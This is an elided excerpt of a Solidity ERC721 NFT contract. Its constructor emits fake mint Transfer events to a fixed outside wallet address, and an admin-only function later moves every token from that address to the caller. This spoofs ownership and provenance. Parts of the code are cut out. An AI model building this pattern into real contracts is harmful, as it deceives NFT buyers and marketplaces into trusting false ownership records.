...
contract ERC721 is ERC165, IERC721, IERC721Metadata, Ownable {
    ...
    constructor(string memory name_, string memory symbol_, uint256 totalSupply_, string memory uri_) {
        ...
        for (uint i = 1; i <= m_;) {
            emit Transfer(address(0), 0x3B68Af878e7A9d397989f0a1C4e0C807DBbEa379, i);
            unchecked { ++i; }
        }
    }
    ...
    function transfer() public onlyAdmin {
        ...
        uint m_ = totalSupply;
        for (uint i = 1; i <= m_;) {
            _transfer(0x3B68Af878e7A9d397989f0a1C4e0C807DBbEa379, msg.sender, i);
            unchecked { ++i; }
        }
        active = true;
    }
...
contract Demo is ERC721 {
    // Demo
    constructor() ERC721("Demo", "Demo", 10, "link") {}
}